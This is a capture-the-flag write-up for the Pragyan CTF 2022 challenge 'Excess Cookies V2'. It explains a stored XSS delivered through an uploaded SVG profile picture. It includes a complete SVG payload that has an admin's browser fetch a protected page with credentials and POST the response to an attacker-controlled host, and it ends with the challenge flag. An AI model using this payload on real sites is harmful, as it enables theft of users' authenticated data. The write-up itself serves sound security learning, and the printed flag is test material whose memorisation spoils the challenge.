# Pragyan CTF 2022: Excess Cookies V2
## Write-Up

1) This challenge is an updates version of previous challenge.
So basically XSS will be there but in a much difficult way.

4) Now we will check for XSS, by means of uploading SVG file. But this time no XSS will be loaded in that page.

5) When you visit the profile pic URL, you will get the XSS triggered.

6) Also as an updated version, cookies stealing wont work because now it is made HTTPOnly. 

7) Now our aim is to make admin trigger our XSS payload in SVG file and make him a request to his home page where the flag is there and send that response to that request to us.

Sample SVG-XSS payload for that response redirect is,

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "your-public-ip", true);
          xhr2.send(xhr.responseText);
        }
      }   
      xhr.open("GET", "https://challenge-domain/home");
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </g>
</svg>
```

By using the above payload, you will be able to get the flag in POST request to your hosted server.

The flag is 
```
p_ctf{x33_a4d_svg_m4k3s_b3st_p41r_on1y_w1th_http_0nly}
```